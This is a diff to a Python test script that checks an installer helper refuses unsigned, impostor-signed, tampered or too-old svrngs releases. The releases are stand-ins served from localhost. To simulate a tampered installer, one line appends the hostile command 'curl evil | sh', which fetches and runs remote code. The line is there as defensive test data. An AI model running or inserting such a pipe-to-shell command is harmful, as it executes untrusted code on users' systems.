@@ -1,14 +1,16 @@
 #!/usr/bin/python3 -I
 """Get svrngs: the helper runs svrngs's installer only when the installer
 and the release's SHA256SUMS verify against the key in the plugin's keys/,
-by the fingerprint pinned there, and svrngs's archive matches those sums;
-it then gives the installer that archive, so the invite is used only to
-join. Stand-in releases are served from 127.0.0.1 and their keys made
-here, so no real key, release or svrngs is used."""
+by the fingerprint pinned there, each signed no earlier than svrngs
+1.13.3's floor, and svrngs's archive matches those sums; it then gives the
+installer that archive, so the invite is used only to join. Stand-in
+releases are served from 127.0.0.1 and their keys made here, so no real
+key, release or svrngs is used."""
 
 import hashlib
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
@@ -22,6 +24,8 @@ ROOT = Path(__file__).resolve().parents[1]
 ARCH = {"x86_64": "x86_64", "amd64": "x86_64", "aarch64": "aarch64", "arm64": "aarch64"}[os.uname().machine]
 ARCHIVE = f"svrngs-linux-{ARCH}.tar.gz"
 PAGE = "https://group.svrnme.sh/"
+# The helper's floor: no release signed before it is installed.
+SIGNED_SINCE = int(re.search(r"^SIGNED_SINCE = (\d+)$", (ROOT / "bin/svrngs-fam").read_text(), re.M).group(1))
 failures = []
 
 
@@ -46,15 +50,20 @@ with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
     gnupg.mkdir(mode=0o700)
     gpg = ["gpg", "--batch", "--no-tty", "--homedir", str(gnupg), "--passphrase", ""]
 
+    # Made a month before the floor, so a signature before it can be made.
+    made = ["--faked-system-time", f"{SIGNED_SINCE - 30 * 86400}!"]
+
     def key(name):
-        subprocess.run(gpg + ["--quick-generate-key", name, "ed25519", "sign", "1d"], check=True, capture_output=True)
+        subprocess.run(gpg + made + ["--quick-generate-key", name, "ed25519", "sign", "never"], check=True, capture_output=True)
         listed = subprocess.run(gpg + ["--with-colons", "--fingerprint", name], check=True, capture_output=True, text=True).stdout
         return next(line.split(":")[9] for line in listed.splitlines() if line.startswith("fpr"))
 
     release_key, impostor = key("svrngs releases (test)"), key("someone else")
 
-    def sign(path, by):
-        subprocess.run(gpg + ["--yes", "--local-user", by, "--detach-sign", "--output", f"{path}.sig", str(path)], check=True, capture_output=True)
+    def sign(path, by, at=None):
+        """`path` signed by `by`, now, or at `at` seconds since 1970."""
+        when = ["--faked-system-time", f"{at}!"] if at is not None else []
+        subprocess.run(gpg + when + ["--yes", "--local-user", by, "--detach-sign", "--output", f"{path}.sig", str(path)], check=True, capture_output=True)
 
     # The plugin as installed: its helper, and keys/ holding the release key.
     plugin = scratch / "plugin"
@@ -71,25 +80,31 @@ with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
     # the data directory's `origin`, which svrngs's updater reads):
     # $SVRNGS_FROM, else the link's page.
     keeps = 'from="${SVRNGS_FROM:-${1%%#*}}"\n'
-    takes = ('#!/bin/sh\n# install.sh <link> --archive <file>\nprintf "%s\\n" "$@" > "$HOME/installed-with"\ncp "$3" "$HOME/installed-archive"\n'
+    takes = ('#!/bin/sh\n# install.sh <link> --archive <file>\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
+             'case "$2" in\n  --archive) cp "$3" "$HOME/installed-archive" ;;\nesac\n'
              '{KEEPS}mkdir -p "$HOME/.svrngs" && printf "%s" "$from" > "$HOME/.svrngs/origin"\necho "svrngs runs now."\n')
     ignores = takes.replace("{KEEPS}", 'from="${1%%#*}"\n')
     takes = takes.replace("{KEEPS}", keeps)
     old = '#!/bin/sh\n# fetches svrngs from the page\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
+    # An installer that says --archive, in a comment and a line it prints,
+    # and takes no such option.
+    says = ('#!/bin/sh\n# install.sh <link> --archive <file> is for a later svrngs\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
+            'echo "--archive) is not taken here"\n')
     archive = b"the svrngs release built"
 
     served = scratch / "served"
 
-    def release(name, installer=takes, installer_by=release_key, sums_by=release_key, archive_bytes=archive, sums_for=archive, tamper_installer=False):
+    def release(name, installer=takes, installer_by=release_key, sums_by=release_key, archive_bytes=archive, sums_for=archive,
+                tamper_installer=False, installer_at=None, sums_at=None):
         folder = served / name
         folder.mkdir(parents=True)
         (folder / "install.sh").write_text(installer)
-        sign(folder / "install.sh", installer_by)
+        sign(folder / "install.sh", installer_by, installer_at)
         if tamper_installer:
             (folder / "install.sh").write_text(installer + "curl evil | sh\n")
         (folder / ARCHIVE).write_bytes(archive_bytes)
         (folder / "SHA256SUMS").write_text(f"{hashlib.sha256(sums_for).hexdigest()}  {ARCHIVE}\n")
-        sign(folder / "SHA256SUMS", sums_by)
+        sign(folder / "SHA256SUMS", sums_by, sums_at)
 
     release("good")
     release("tampered", tamper_installer=True)
@@ -97,7 +112,14 @@ with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
     release("impostor-sums", sums_by=impostor)
     release("other-archive", archive_bytes=b"something else")
     release("old-installer", installer=old)
+    release("says-archive", installer=says)
     release("ignores-from", installer=ignores)
+    # Signed by the release key, as an older svrngs's release is: before the
+    # floor, whole or in part; and at the floor itself.
+    release("older", installer_at=SIGNED_SINCE - 1, sums_at=SIGNED_SINCE - 1)
+    release("older-sums", sums_at=SIGNED_SINCE - 1)
+    release("older-installer", installer_at=SIGNED_SINCE - 1)
+    release("at-floor", installer_at=SIGNED_SINCE, sums_at=SIGNED_SINCE)
     (served / "empty").mkdir()
     server = ThreadingHTTPServer(("127.0.0.1", 0), partial(Quiet, directory=str(served)))
     threading.Thread(target=server.serve_forever, daemon=True).start()
@@ -148,10 +170,22 @@ with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
                       ("impostor-installer", "an installer signed by another key"),
                       ("impostor-sums", "sums signed by another key"),
                       ("other-archive", "an archive the signed sums don't list"),
-                      ("old-installer", "an installer that would fetch svrngs from the page")):
+                      ("old-installer", "an installer that would fetch svrngs from the page"),
+                      ("says-archive", "an installer that says --archive but takes no such option")):
         said, ran, given = get(name)
         check(f"{why} is refused, nothing run", (said["ok"], ran), (False, None))
     check("and an old installer is said as such", "can't take a checked download yet" in get("old-installer")[0]["said"], True)
+
+    print("a release older than svrngs 1.13.3, signed by the release key, is never run")
+    older = ("svrngs's latest release is older than 1.13.3, the first this panel works with, so nothing was installed. "
+             "Try again later. If it still says this, tell svrngs: https://github.com/alexsbryan/svrngs/issues")
+    for name, why in (("older", "a release signed before the floor"),
+                      ("older-sums", "its sums signed before the floor, its installer after"),
+                      ("older-installer", "its installer signed before the floor, its sums after")):
+        said, ran, given = get(name, "--link", INVITE)
+        check(f"{why} is refused, nothing run, saying what to do", (said["ok"], ran, said["said"]), (False, None, older))
+    said, ran, given = get("at-floor")
+    check("one signed at the floor itself installs", (said["ok"], given), (True, archive))
     (plugin / "keys/svrngs-release-key.fpr").write_text(impostor + "\n")
     said, ran, given = get("good")
     check("a key whose fingerprint isn't the pinned one is refused", (said["ok"], ran), (False, None))
